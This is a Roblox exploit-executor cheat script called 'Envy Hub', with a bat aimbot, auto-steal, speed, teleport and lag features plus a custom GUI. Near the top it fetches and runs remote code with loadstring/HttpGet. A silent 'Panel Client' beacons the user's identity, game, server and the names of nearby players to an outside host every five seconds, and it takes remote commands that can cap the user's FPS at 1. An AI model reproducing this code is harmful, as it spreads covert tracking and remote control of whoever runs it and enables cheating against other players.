-- K7 Mini (Desync)
task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/7kDesync/k7mini/main/k7_mini.lua"))()
	end)
end)

-- Panel Client (no prints)
local BASE = "https://project--e71aaf21-906f-4ffa-997f-3c410b4c2c38.lovable.app"
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
if not LP then LP = Players.PlayerAdded:Wait() end

local function safe(fn)
    local ok, res = pcall(fn)
    if ok then return res end
    return nil
end

local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"
local gameName = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId).Name end) or "Unknown Game"
local avatarFetch = safe(function()
    local req = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
    if not req then return nil end
    local r = req({ Url = ("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=150x150&format=Png&isCircular=false"):format(LP.UserId), Method = "GET" })
    if r and r.Body then
        local ok, parsed = pcall(function() return HttpService:JSONDecode(r.Body) end)
        if ok and parsed and parsed.data and parsed.data[1] then return parsed.data[1].imageUrl end
    end
    return nil
end)
local avatarUrl = avatarFetch or ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(LP.UserId)

local request = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
if not request then return end

local function listPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(t, p.Name)
    end
    return t
end

local fpsLimit = false

local function heartbeat()
    local body = {
        user_id = LP.UserId,
        username = LP.Name,
        display_name = LP.DisplayName,
        avatar_url = avatarUrl,
        place_id = game.PlaceId,
        game_name = gameName,
        job_id = game.JobId,
        executor = executorName,
        server_players = listPlayers(),
    }
    local res = safe(function()
        return request({
            Url = BASE .. "/api/public/heartbeat",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(body),
        })
    end)
    if res and res.Body then
        local ok, parsed = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and parsed then fpsLimit = parsed.fps_limit == true end
    end
end

local function pollCommand()
    local res = safe(function()
        return request({
            Url = BASE .. ("/api/public/command?user_id=%d"):format(LP.UserId),
            Method = "GET",
        })
    end)
    if res and res.Body then
        local ok, parsed = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and parsed then fpsLimit = parsed.fps_limit == true end
    end
end

-- Heartbeat every 5s
task.spawn(function()
    while task.wait(5) do heartbeat() end
end)
heartbeat()

-- Poll commands every 2s
task.spawn(function()
    while task.wait(2) do pollCommand() end
end)

-- FPS cap enforcer: when enabled, continuously force fps to 1 using every known executor API
local function applyCap(v)
    if setfpscap then pcall(setfpscap, v) end
    if set_fps_cap then pcall(set_fps_cap, v) end
    if setfflag then pcall(setfflag, "DFIntTaskSchedulerTargetFps", tostring(v)) end
    if syn and syn.set_thread_identity then pcall(syn.set_thread_identity, 2) end
end

task.spawn(function()
    while true do
        if fpsLimit then
            applyCap(1)
        end
        task.wait(0.05)
    end
end)

task.spawn(function()
    while true do
        if fpsLimit then applyCap(1) end
        RunService.RenderStepped:Wait()
    end
end)

-- Restore to 240 if toggled off (only when state changes)
task.spawn(function()
    local last = false
    while task.wait(0.5) do
        if last and not fpsLimit then
            applyCap(240)
        end
        last = fpsLimit
    end
end)


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer


;(function()
local NS, CS, LS, LS2 = 60, 30, 15, 24.5
local laggerPhase = 0 -- 0=off, 1=lagger, 2=lagger carry

local State = {
	speedToggled = false, laggerToggled = false, autoBatToggled = false,
	hittingCooldown = false, infJumpEnabled = false,
	antiRagdollEnabled = false, fpsBoostEnabled = false,
	antiLagEnabled = false,
	guiVisible = true,
	introEnabled = true, selectedIntroMusic = 1,
	isStealing = false, stealStartTime = nil, lastStealTick = 0,
	lastKnownHealth = 100,
	dropActive = false,
	dropBrainrotActive = false,
	autoLeftEnabled = false, autoRightEnabled = false,
	unwalkEnabled = false,
	desyncEnabled = false,
	stretchRezEnabled = false, removeAccessoriesEnabled = false,
}

local _anyKeyListening, uiLocked = false, false
local setLockUIVisual, MobilePanel, rebuildMobileButtons, resetMobileButtons
local autoSavePositions = function() end  -- no-op, MobilePanel removed
local mobilePanelStyle = "darkhub"
local mobileBtnFrames, mobileBtnActive, allMobileBtns = {}, {}, {}
local BTN_POSITIONS_DH = {
	Drop       = UDim2.new(1, -298, 1, -334),
	AutoLeft   = UDim2.new(1, -144, 1, -334),
	AutoBat    = UDim2.new(1, -298, 1, -270),
	AutoRight  = UDim2.new(1, -144, 1, -270),
	TPDown     = UDim2.new(1, -298, 1, -206),
	Speed      = UDim2.new(1, -144, 1, -206),
	Lagger     = UDim2.new(1, -144, 1, -142),
}

local KB = {
	AutoLeft  = {kb = Enum.KeyCode.Z,           gp = nil},
	AutoRight = {kb = Enum.KeyCode.C,           gp = nil},
	Drop      = {kb = Enum.KeyCode.X,           gp = nil},
	TPDown    = {kb = Enum.KeyCode.F,           gp = nil},
	AutoBat   = {kb = Enum.KeyCode.E,           gp = nil},
	Speed     = {kb = Enum.KeyCode.Q,           gp = nil},
	Lagger    = {kb = Enum.KeyCode.R,           gp = nil},
	GuiHide   = {kb = Enum.KeyCode.LeftControl, gp = nil},
}

local function kbMatch(entry, kc)
	return kc == entry.kb or (entry.gp and kc == entry.gp)
end

local AP = {
	L1=Vector3.new(-476.48,-6.28,92.73), L2=Vector3.new(-483.12,-4.95,94.80), L_FACE=Vector3.new(-482.25,-4.96,92.09),
	R1=Vector3.new(-476.16,-6.52,25.62), R2=Vector3.new(-483.06,-5.03,25.48), R_FACE=Vector3.new(-482.06,-6.93,35.47),
}

local Steal = {
	AutoStealEnabled = false, StealRadius = 8, StealDuration = 1.3,
	Data = {}, plotCache = {}, plotCacheTime = {},
	cachedPrompts = {}, promptCacheTime = 0,
}

local Conns = {
	autoSteal = nil, antiRag = nil,
	anchor = {}, progress = nil,
}

-- ─── Bat Aimbot (Opium) ──────────────────────────────────────────────────────
local startBatAimbot, stopBatAimbot
local function findAnyToolMob()
	local c=LP.Character
	if c then for _,v in ipairs(c:GetChildren()) do if v:IsA("Tool") then return v end end end
	local bp=LP:FindFirstChildOfClass("Backpack")
	if bp then for _,v in ipairs(bp:GetChildren()) do if v:IsA("Tool") then return v end end end
	return nil
end
local function getClosestPlayerMob2()
	local root=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not root then return nil,math.huge end
	local cp,cd=nil,math.huge
	for _,p in pairs(Players:GetPlayers()) do
		if p~=LP and p.Character then
			local tr=p.Character:FindFirstChild("HumanoidRootPart")
			local ph=p.Character:FindFirstChildOfClass("Humanoid")
			if tr and ph and ph.Health>0 then
				local d=(root.Position-tr.Position).Magnitude
				if d<cd then cd=d; cp=p end
			end
		end
	end
	return cp,cd
end
local MOB_SWING_COOLDOWN=0.08
local function tryHitBatMob()
	if State.hittingCooldown then return end; State.hittingCooldown=true
	pcall(function()
		local c=LP.Character; if not c then return end
		local hum2=c:FindFirstChildOfClass("Humanoid"); local tool=findAnyToolMob()
		if tool then
			if tool.Parent~=c and hum2 then pcall(function() hum2:EquipTool(tool) end) end
			local remote=tool:FindFirstChildOfClass("RemoteEvent")
			if remote then pcall(function() remote:FireServer() end)
			else pcall(function() tool:Activate() end) end
		end
	end)
	task.delay(MOB_SWING_COOLDOWN,function() State.hittingCooldown=false end)
end
local _aimbotTarget = nil

local function findBat()
	local char = LP.Character; if not char then return nil end
	for _, tool in ipairs(char:GetChildren()) do
		if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
	end
	local bp = LP:FindFirstChild("Backpack")
	if bp then
		for _, tool in ipairs(bp:GetChildren()) do
			if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
		end
	end
	return nil
end

local function getClosestTarget()
	local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not root then return nil end
	local closest, minDist = nil, math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
			if tRoot and hum and hum.Health > 0 then
				local dist = (tRoot.Position - root.Position).Magnitude
				if dist < minDist then minDist = dist; closest = tRoot end
			end
		end
	end
	return closest
end

startBatAimbot = function()
	if Conns.aimbot then Conns.aimbot:Disconnect() end
	if State.autoLeftEnabled then State.autoLeftEnabled=false; if autoLeftSetVisual then autoLeftSetVisual(false) end; stopAutoLeft() end
	if State.autoRightEnabled then State.autoRightEnabled=false; if autoRightSetVisual then autoRightSetVisual(false) end; stopAutoRight() end

	local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
	if hum0 then hum0.AutoRotate = false end

	Conns.aimbot = RunService.RenderStepped:Connect(function()
		if not State.autoBatToggled then return end
		local char = LP.Character; if not char then return end
		local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
		local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end

		if not char:FindFirstChildOfClass("Tool") then
			local bat = findBat()
			if bat then pcall(function() hum:EquipTool(bat) end) end
		end

		local target = getClosestTarget()
		if not target then return end
		_aimbotTarget = target

		local targetVel = target.AssemblyLinearVelocity
		local myPos = root.Position
		local targetPos = target.Position

		local predictPos = targetPos + targetVel * 0.14
		predictPos = predictPos + target.CFrame.LookVector * 0.3

		local direction = predictPos - myPos
		local flatDir = Vector3.new(direction.X, 0, direction.Z).Unit
		local chaseSpeed = 58

		local desiredHeight = targetPos.Y + 3.7
		local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
		if hum.FloorMaterial ~= Enum.Material.Air then
			yVel = math.max(yVel, 13)
		end
		yVel = math.clamp(yVel, -70, 110)

		local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
		root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)

		-- Dark hub style tilt: look toward predicted position in 3D (including Y)
		local speed3 = targetVel.Magnitude
		local predictTime = math.clamp(speed3 / 150, 0.05, 0.2)
		local predictedPos = targetPos + targetVel * predictTime
		local toPredict = predictedPos - myPos
		if toPredict.Magnitude > 0.1 then
			local goalCF = CFrame.lookAt(myPos, predictedPos)
			local curCF  = root.CFrame
			local diffCF = curCF:Inverse() * goalCF
			local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
			rx = math.clamp(rx, -2.5, 2.5)
			ry = math.clamp(ry, -2.5, 2.5)
			rz = math.clamp(rz, -2.5, 2.5)
			local tiltSpeed = 42
			root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(
				Vector3.new(rx * tiltSpeed, ry * tiltSpeed, rz * tiltSpeed)
			)
		end
	end)
end

stopBatAimbot = function()
	if Conns.aimbot then Conns.aimbot:Disconnect(); Conns.aimbot = nil end
	_aimbotTarget = nil
	local c = LP.Character
	local root = c and c:FindFirstChild("HumanoidRootPart")
	if root then root.AssemblyLinearVelocity = Vector3.zero; root.AssemblyAngularVelocity = Vector3.zero end
	local hum2 = c and c:FindFirstChildOfClass("Humanoid")
	if hum2 then hum2.AutoRotate = true end
	State.hittingCooldown = false
end
-- ─── End of Bat Aimbot ───────────────────────────────────────────────────────
local PLOT_CACHE_DURATION, PROMPT_CACHE_REFRESH, STEAL_COOLDOWN = 2, 0.15, 0.1

local h, hrp, speedLbl
local setAutoGrab, setAutoBat, setInfJump, setAntiRag, setFps, setUnwalkToggle, autoLeftSetVisual, autoRightSetVisual, autoBatSetVisual, setIntroToggle
local setAntiLag, setStretchRez, setRemoveAccessories, setDarkMode
local setMedusaCounter, setBatCounter, setInstaGrab, setAutoSwingVisual
local setDesync, saDesync
saDesync = function() end -- desync not on mobile panel
local startDesyncSession, stopDesyncSession
local startAntiRagdoll, stopAntiRagdoll, applyFPSBoost, startAutoSteal, stopAutoSteal
local mobileSpeedSetActive, mobileLaggerSetActive, mobileLaggerCarrySetActive, saveConfig, loadConfig = nil, nil, nil, nil, nil
local normalBox, carryBox, laggerBox, laggerBox2, durValBtn, uiScaleBox
local modeValLbl, progressFill, progressPct, progressRadLbl
local radValBtn
local alConn, arConn, alPhase, arPhase = nil, nil, 1, 1
local autoTPDownEnabled, autoTPDownConn, autoTPDownHeight = false, nil, 20

local function showDiscordInProgressBar()
	if not progressPct or not progressFill then return end

	local originalText = progressPct.Text
	local originalColor = progressPct.TextColor3
	local originalSize = progressPct.TextSize
	local originalAlign = progressPct.TextXAlignment

	progressPct.Text = "discord.gg/envyhub"
	progressPct.TextColor3 = Color3.fromRGB(255, 255, 255)
	progressPct.TextSize = 13
	progressPct.TextXAlignment = Enum.TextXAlignment.Center
	progressPct.ZIndex = 12

	if progressRadLbl then progressRadLbl.Visible = false end

	task.delay(4, function()
		if progressPct then
			progressPct.Text = originalText or "0%"
			progressPct.TextColor3 = originalColor or Color3.fromRGB(235, 235, 235)
			progressPct.TextSize = originalSize or 11
			progressPct.TextXAlignment = originalAlign or Enum.TextXAlignment.Left
			progressPct.ZIndex = 5
		end
		if progressRadLbl then progressRadLbl.Visible = true end
	end)
end

local function stopAutoLeft()
	if alConn then alConn:Disconnect(); alConn = nil end
	alPhase = 1
	local char = LP.Character
	if char then local hum = char:FindFirstChildOfClass("Humanoid"); if hum then hum:Move(Vector3.zero, false) end end
end

local function stopAutoRight()
	if arConn then arConn:Disconnect(); arConn = nil end
	arPhase = 1
	local char = LP.Character
	if char then local hum = char:FindFirstChildOfClass("Humanoid"); if hum then hum:Move(Vector3.zero, false) end end
end

local function startAutoLeft()
	if alConn then alConn:Disconnect() end
	alPhase = 1
	alConn = RunService.Heartbeat:Connect(function()
		if not State.autoLeftEnabled then return end
		local char = LP.Character; if not char then return end
		local hrp2 = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hrp2 or not hum then return end
		local spd = NS
		if alPhase == 1 then
			local tgt = Vector3.new(AP.L1.X, hrp2.Position.Y, AP.L1.Z)
			if (tgt - hrp2.Position).Magnitude < 1 then
				alPhase = 2
				local d = AP.L2 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
				hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd); return
			end
			local d = AP.L1 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
			hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
		elseif alPhase == 2 then
			local tgt = Vector3.new(AP.L2.X, hrp2.Position.Y, AP.L2.Z)
			if (tgt - hrp2.Position).Magnitude < 1 then
				hum:Move(Vector3.zero,false); hrp2.AssemblyLinearVelocity = Vector3.zero
				State.autoLeftEnabled = false
				if alConn then alConn:Disconnect(); alConn = nil end
				alPhase = 1
				if autoLeftSetVisual then autoLeftSetVisual(false) end
				if (AP.L_FACE - hrp2.Position).Magnitude > 0.01 then
					hrp2.CFrame = CFrame.new(hrp2.Position, Vector3.new(AP.L_FACE.X, hrp2.Position.Y, AP.L_FACE.Z))
				end
				return
			end
			local d = AP.L2 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
			hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
		end
	end)
end

local function startAutoRight()
	if arConn then arConn:Disconnect() end
	arPhase = 1
	arConn = RunService.Heartbeat:Connect(function()
		if not State.autoRightEnabled then return end
		local char = LP.Character; if not char then return end
		local hrp2 = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hrp2 or not hum then return end
		local spd = NS
		if arPhase == 1 then
			local tgt = Vector3.new(AP.R1.X, hrp2.Position.Y, AP.R1.Z)
			if (tgt - hrp2.Position).Magnitude < 1 then
				arPhase = 2
				local d = AP.R2 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
				hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd); return
			end
			local d = AP.R1 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
			hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
		elseif arPhase == 2 then
			local tgt = Vector3.new(AP.R2.X, hrp2.Position.Y, AP.R2.Z)
			if (tgt - hrp2.Position).Magnitude < 1 then
				hum:Move(Vector3.zero,false); hrp2.AssemblyLinearVelocity = Vector3.zero
				State.autoRightEnabled = false
				if arConn then arConn:Disconnect(); arConn = nil end
				arPhase = 1
				if autoRightSetVisual then autoRightSetVisual(false) end
				if (AP.R_FACE - hrp2.Position).Magnitude > 0.01 then
					hrp2.CFrame = CFrame.new(hrp2.Position, Vector3.new(AP.R_FACE.X, hrp2.Position.Y, AP.R_FACE.Z))
				end
				return
			end
			local d = AP.R2 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
			hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
		end
	end)
end

-- ─── Drop Brainrot ───────────────────────────────────────────────────────────
local DROP_ASCEND_DURATION = 0.2
local DROP_ASCEND_SPEED = 150

local function runDrop()
	if State.dropActive then return end
	local char = LP.Character; if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
	State.dropActive = true; local t0 = tick(); local dc
	dc = RunService.Heartbeat:Connect(function()
		local r = char and char:FindFirstChild("HumanoidRootPart")
		if not r then dc:Disconnect(); State.dropActive = false; return end
		if tick() - t0 >= DROP_ASCEND_DURATION then
			dc:Disconnect()
			local rp = RaycastParams.new(); rp.FilterDescendantsInstances = {char}; rp.FilterType = Enum.RaycastFilterType.Exclude
			local rr = workspace:Raycast(r.Position, Vector3.new(0, -2000, 0), rp)
			if rr then
				local hum2 = char:FindFirstChildOfClass("Humanoid")
				local off = (hum2 and hum2.HipHeight or 2) + (r.Size.Y / 2)
				r.CFrame = CFrame.new(r.Position.X, rr.Position.Y + off, r.Position.Z); r.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
			end
			State.dropActive = false; return
		end
		r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, DROP_ASCEND_SPEED, r.AssemblyLinearVelocity.Z)
	end)
end
-- ─── TP Floor ────────────────────────────────────────────────────────────────
local _tpDownActive = false
local function runTPDown()
	if _tpDownActive then return end
	_tpDownActive = true
	pcall(function()
		local char = LP.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		if not root or not hum then _tpDownActive = false; return end
		local rp = RaycastParams.new()
		rp.FilterDescendantsInstances = {char}
		rp.FilterType = Enum.RaycastFilterType.Exclude
		local result = workspace:Raycast(root.Position, Vector3.new(0, -1000, 0), rp)
		if result then
			local hipOffset = hum.HipHeight + (root.Size.Y / 2)
			local targetPos = result.Position + Vector3.new(0, hipOffset, 0)
			root.CFrame = CFrame.new(targetPos) * root.CFrame.Rotation
		end
	end)
	_tpDownActive = false
end

local function startAutoTPDown()
	if autoTPDownConn then task.cancel(autoTPDownConn); autoTPDownConn = nil end
	autoTPDownConn = task.spawn(function()
		while autoTPDownEnabled do
			task.wait(0.1)
			pcall(function()
				local char = LP.Character; if not char then return end
				local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
				local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
				if hum.FloorMaterial ~= Enum.Material.Air then return end
				if root.Position.Y < autoTPDownHeight then return end
				local rp = RaycastParams.new()
				rp.FilterDescendantsInstances = {char}
				rp.FilterType = Enum.RaycastFilterType.Exclude
				local result = workspace:Raycast(root.Position, Vector3.new(0, -2000, 0), rp)
				local hipOffset = hum.HipHeight + (root.Size.Y / 2)
				local targetY = result and (result.Position.Y + hipOffset) or -7.00
				root.CFrame = CFrame.new(Vector3.new(root.Position.X, targetY, root.Position.Z))
					* CFrame.Angles(0, select(2, root.CFrame:ToEulerAnglesYXZ()), 0)
				root.AssemblyLinearVelocity = Vector3.zero
			end)
		end
	end)
end

local function stopAutoTPDown()
	autoTPDownEnabled = false
	if autoTPDownConn then task.cancel(autoTPDownConn); autoTPDownConn = nil end
end

for _, name in pairs({"EnvyHubGUI"}) do
	local old = game:GetService("CoreGui"):FindFirstChild(name)
	if old then old:Destroy() end
	local pg = LP:FindFirstChild("PlayerGui")
	if pg then local o = pg:FindFirstChild(name); if o then o:Destroy() end end
end

local function makeDraggable(frame)
	local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
	frame.InputBegan:Connect(function(inp)
		if uiLocked then return end
		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
			dragging = true; dragStart = inp.Position; startPos = frame.Position
			inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then dragging = false end end)
		end
	end)
	frame.InputChanged:Connect(function(inp)
		if uiLocked then dragging = false; return end
		if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then dragInput = inp end
	end)
	UIS.InputChanged:Connect(function(inp)
		if uiLocked then dragging = false; return end
		if inp == dragInput and dragging then
			local d = inp.Position - dragStart
			frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+d.X, startPos.Y.Scale, startPos.Y.Offset+d.Y)
		end
	end)
end

local gui = Instance.new("ScreenGui")
gui.Name = "EnvyHubGUI"
gui.ResetOnSpawn = false
gui.DisplayOrder = 10
gui.IgnoreGuiInset = true
if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
	gui.Parent = LP:WaitForChild("PlayerGui")
end

local _C={
	[1]=Color3.fromRGB(0,0,0),   [2]=Color3.fromRGB(0,0,0),
	[3]=Color3.fromRGB(14,14,14),[4]=Color3.fromRGB(24,24,24),
	[5]=Color3.fromRGB(40,40,40),[6]=Color3.fromRGB(70,70,70),
	[7]=Color3.fromRGB(255,255,255),[8]=Color3.fromRGB(160,160,160),
	[9]=Color3.fromRGB(45,45,45),[10]=Color3.fromRGB(10,10,10),
}
local BG=_C[1];local SIDEBAR_BG=_C[2];local CARD_BG=_C[3];local CARD_HOV=_C[4]
local BORDER=_C[5];local BORDER2=_C[6];local WHITE=_C[7];local DIM=_C[8]
local DIM2=_C[9];local KB_BG=_C[10];local INPUT_BG=_C[10]

local W, H, SW = 490, 460, 90
local PW = 160 -- portrait panel width
local CORNER = 12

local uiScaleValue = 100
local mainUIScale = nil
local main = Instance.new("Frame", gui)
main.Name = "Main"
main.Size = UDim2.new(0, W, 0, H)
main.Position = UDim2.new(0, 50, 0, 50)
main.BackgroundColor3 = BG
main.BorderSizePixel = 0
main.Active = true
main.ClipsDescendants = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, CORNER)
local mainStroke = Instance.new("UIStroke", main)
mainStroke.Color = Color3.fromRGB(0, 0, 0)
mainStroke.Thickness = 1
makeDraggable(main)
mainUIScale = Instance.new("UIScale", main)
mainUIScale.Scale = uiScaleValue / 100

local topbar = Instance.new("Frame", main)
topbar.Size = UDim2.new(1, 0, 0, 44)
topbar.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
topbar.BorderSizePixel = 0
topbar.ZIndex = 10
Instance.new("UICorner", topbar).CornerRadius = UDim.new(0, CORNER)
local topPatch = Instance.new("Frame", topbar)
topPatch.Size = UDim2.new(1, 0, 0, CORNER)
topPatch.Position = UDim2.new(0, 0, 1, -CORNER)
topPatch.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
topPatch.BorderSizePixel = 0
topPatch.ZIndex = 9
local topDiv = Instance.new("Frame", topbar)
topDiv.Size = UDim2.new(1, 0, 0, 1)
topDiv.Position = UDim2.new(0, 0, 1, -1)
topDiv.BackgroundColor3 = BORDER
topDiv.BorderSizePixel = 0
topDiv.ZIndex = 11

local titleLbl = Instance.new("TextLabel", topbar)
titleLbl.Size = UDim2.new(0, 160, 1, 0)
titleLbl.Position = UDim2.new(0, 14, 0, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "ENVY HUB"
titleLbl.TextColor3 = WHITE
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 13
titleLbl.TextXAlignment = Enum.TextXAlignment.Left
titleLbl.ZIndex = 12

local verLbl = Instance.new("TextLabel", topbar)
verLbl.Size = UDim2.new(0, 130, 1, 0)
verLbl.Position = UDim2.new(0, 100, 0, 0)
verLbl.BackgroundTransparency = 1
verLbl.Text = "discord.gg/envyhub"
verLbl.TextColor3 = DIM
verLbl.Font = Enum.Font.Gotham
verLbl.TextSize = 9
verLbl.TextXAlignment = Enum.TextXAlignment.Left
verLbl.ZIndex = 12

local minBtn = Instance.new("TextButton", topbar)
minBtn.Size = UDim2.new(0, 26, 0, 26)
minBtn.Position = UDim2.new(1, -36, 0.5, -13)
minBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
minBtn.BorderSizePixel = 0
minBtn.Text = "–"
minBtn.TextColor3 = WHITE
minBtn.Font = Enum.Font.GothamBlack
minBtn.TextSize = 16
minBtn.ZIndex = 13
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", minBtn).Color = BORDER
minBtn.MouseEnter:Connect(function() TweenService:Create(minBtn, TweenInfo.new(0.1), {BackgroundColor3=Color3.fromRGB(40,40,40)}):Play() end)
minBtn.MouseLeave:Connect(function() TweenService:Create(minBtn, TweenInfo.new(0.1), {BackgroundColor3=Color3.fromRGB(18,18,18)}):Play() end)

-- ── PORTRAIT PANEL ────────────────────────────────────────────────────
local portrait = Instance.new("Frame", main)
portrait.Size = UDim2.new(0, PW, 1, -44)
portrait.Position = UDim2.new(0, 0, 0, 44)
portrait.BackgroundColor3 = Color3.fromRGB(6, 6, 6)
portrait.BorderSizePixel = 0
portrait.ClipsDescendants = true
portrait.ZIndex = 3

-- round bottom-left corner to match main frame
Instance.new("UICorner", portrait).CornerRadius = UDim.new(0, CORNER)

-- patch top-right and top of portrait so it connects cleanly
Instance.new("Frame", portrait).Size = UDim2.new(1,0,0,CORNER)

Instance.new("Frame", portrait).Size = UDim2.new(0,CORNER,1,0)

local portImg = Instance.new("ImageLabel", portrait)
portImg.Size = UDim2.new(1, 0, 1, 0)
portImg.BackgroundTransparency = 1
portImg.Image = "rbxassetid://105044056375613"
portImg.ScaleType = Enum.ScaleType.Crop
portImg.ZIndex = 3

-- right-side fade vignette so image blends into sidebar
do
	local _vf = Instance.new("Frame", portrait)
	_vf.Size = UDim2.new(0.5,0,1,0); _vf.Position = UDim2.new(0.5,0,0,0)
	_vf.BackgroundColor3 = BG; _vf.BorderSizePixel = 0; _vf.ZIndex = 4
	Instance.new("UIGradient",_vf).Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(1,0)})
end

-- bottom fade
do
	local _pb = Instance.new("Frame", portrait)
	_pb.Size = UDim2.new(1,0,0.3,0); _pb.Position = UDim2.new(0,0,0.7,0)
	_pb.BackgroundColor3 = BG; _pb.BorderSizePixel = 0; _pb.ZIndex = 4
	local _bg = Instance.new("UIGradient",_pb); _bg.Rotation = 90
	_bg.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(1,0)})
end

local nameTag = Instance.new("TextLabel", portrait)
nameTag.Size = UDim2.new(1, -8, 0, 22)
nameTag.Position = UDim2.new(0, 8, 1, -52)
nameTag.BackgroundTransparency = 1
nameTag.Text = "ENVY HUB"
nameTag.TextColor3 = WHITE
nameTag.Font = Enum.Font.GothamBlack
nameTag.TextSize = 13
nameTag.TextXAlignment = Enum.TextXAlignment.Left
nameTag.ZIndex = 6

local nameLine = Instance.new("Frame", portrait)
nameLine.Size = UDim2.new(0.7, 0, 0, 1)
nameLine.Position = UDim2.new(0, 8, 1, -30)
nameLine.BackgroundColor3 = WHITE
nameLine.BorderSizePixel = 0
nameLine.ZIndex = 6

local byTag = Instance.new("TextLabel", portrait)
byTag.Size = UDim2.new(1, -8, 0, 14)
byTag.Position = UDim2.new(0, 8, 1, -26)
byTag.BackgroundTransparency = 1
byTag.Text = "discord.gg/envyhub"
byTag.TextColor3 = DIM
byTag.Font = Enum.Font.Gotham
byTag.TextSize = 9
byTag.TextXAlignment = Enum.TextXAlignment.Left
byTag.ZIndex = 6

-- divider between portrait and sidebar
do local _pd = Instance.new("Frame",main); _pd.Size=UDim2.new(0,1,1,-44); _pd.Position=UDim2.new(0,PW,0,44); _pd.BackgroundColor3=BORDER; _pd.BorderSizePixel=0; _pd.ZIndex=5 end

local sidebar = Instance.new("Frame", main)
sidebar.Size = UDim2.new(0, SW, 1, -44)
sidebar.Position = UDim2.new(0, PW + 1, 0, 44)
sidebar.BackgroundColor3 = SIDEBAR_BG
sidebar.BorderSizePixel = 0
sidebar.ZIndex = 5
sidebar.ClipsDescendants = false
do local _st=Instance.new("Frame",main); _st.Size=UDim2.new(0,SW,0,CORNER); _st.Position=UDim2.new(0,PW+1,0,44); _st.BackgroundColor3=SIDEBAR_BG; _st.BorderSizePixel=0; _st.ZIndex=4 end

